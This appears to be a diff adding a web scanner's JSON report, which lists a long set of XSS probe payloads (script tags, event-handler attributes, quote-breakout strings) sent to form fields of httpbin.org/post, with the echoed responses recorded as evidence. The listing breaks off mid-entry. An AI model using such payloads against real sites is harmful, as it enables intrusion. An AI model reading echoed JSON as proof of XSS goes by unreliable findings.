@@ -1,0 +1,1296 @@
+{
+  "sql_injection": [],
+  "xss": [
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "<script>alert('XSS')</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"<script>alert('XSS')</script>\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"124\", \n    \"Content-Type\": \"application/x-www-for",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "<img src=x onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"<img src=x onerror=alert('XSS')>\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"125\", \n    \"Content-Type\": \"application/x-www-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "<svg onload=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"<svg onload=alert('XSS')>\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"116\", \n    \"Content-Type\": \"application/x-www-form-ur",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "javascript:alert('XSS')",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"javascript:alert('XSS')\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"110\", \n    \"Content-Type\": \"application/x-www-form-urle",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "<iframe src=javascript:alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"<iframe src=javascript:alert('XSS')>\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"129\", \n    \"Content-Type\": \"application/x-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "<body onload=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"<body onload=alert('XSS')>\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"117\", \n    \"Content-Type\": \"application/x-www-form-u",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "<input onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"<input onfocus=alert('XSS') autofocus>\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"129\", \n    \"Content-Type\": \"application/",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "<select onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"<select onfocus=alert('XSS') autofocus>\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"130\", \n    \"Content-Type\": \"application",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "<textarea onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"<textarea onfocus=alert('XSS') autofocus>\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"132\", \n    \"Content-Type\": \"applicati",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "<keygen onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"<keygen onfocus=alert('XSS') autofocus>\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"130\", \n    \"Content-Type\": \"application",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "<video><source onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"<video><source onerror=alert('XSS')>\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"131\", \n    \"Content-Type\": \"application/x-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "<audio src=x onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"<audio src=x onerror=alert('XSS')>\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"127\", \n    \"Content-Type\": \"application/x-ww",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "<details open ontoggle=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"<details open ontoggle=alert('XSS')>\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"127\", \n    \"Content-Type\": \"application/x-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "';alert('XSS');//",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"';alert('XSS');//\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"112\", \n    \"Content-Type\": \"application/x-www-form-urlencoded",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "\";alert('XSS');//",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\\\";alert('XSS');//\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"112\", \n    \"Content-Type\": \"application/x-www-form-urlencode",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "</script><script>alert('XSS')</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"</script><script>alert('XSS')</script>\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"139\", \n    \"Content-Type\": \"application/",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"<script>alert(String.fromCharCode(88,83,83))</script>\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"152\", \n    \"Content-Type\"",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "<script>alert(/XSS/)</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"<script>alert(/XSS/)</script>\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"124\", \n    \"Content-Type\": \"application/x-www-for",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "<script>alert`XSS`</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"<script>alert`XSS`</script>\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"118\", \n    \"Content-Type\": \"application/x-www-form-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custname",
+      "payload": "<script>alert(1)</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"<script>alert(1)</script>\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"116\", \n    \"Content-Type\": \"application/x-www-form-ur",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "<script>alert('XSS')</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"<script>alert('XSS')</script>\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"124\", \n    \"Content-Type\": \"application/x-www-for",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "<img src=x onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"<img src=x onerror=alert('XSS')>\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"125\", \n    \"Content-Type\": \"application/x-www-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "<svg onload=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"<svg onload=alert('XSS')>\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"116\", \n    \"Content-Type\": \"application/x-www-form-ur",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "javascript:alert('XSS')",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"javascript:alert('XSS')\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"110\", \n    \"Content-Type\": \"application/x-www-form-urle",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "<iframe src=javascript:alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"<iframe src=javascript:alert('XSS')>\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"129\", \n    \"Content-Type\": \"application/x-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "<body onload=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"<body onload=alert('XSS')>\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"117\", \n    \"Content-Type\": \"application/x-www-form-u",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "<input onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"<input onfocus=alert('XSS') autofocus>\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"129\", \n    \"Content-Type\": \"application/",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "<select onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"<select onfocus=alert('XSS') autofocus>\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"130\", \n    \"Content-Type\": \"application",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "<textarea onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"<textarea onfocus=alert('XSS') autofocus>\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"132\", \n    \"Content-Type\": \"applicati",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "<keygen onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"<keygen onfocus=alert('XSS') autofocus>\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"130\", \n    \"Content-Type\": \"application",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "<video><source onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"<video><source onerror=alert('XSS')>\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"131\", \n    \"Content-Type\": \"application/x-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "<audio src=x onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"<audio src=x onerror=alert('XSS')>\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"127\", \n    \"Content-Type\": \"application/x-ww",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "<details open ontoggle=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"<details open ontoggle=alert('XSS')>\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"127\", \n    \"Content-Type\": \"application/x-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "';alert('XSS');//",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"';alert('XSS');//\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"112\", \n    \"Content-Type\": \"application/x-www-form-urlencoded",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "\";alert('XSS');//",
+      "method": "POST",
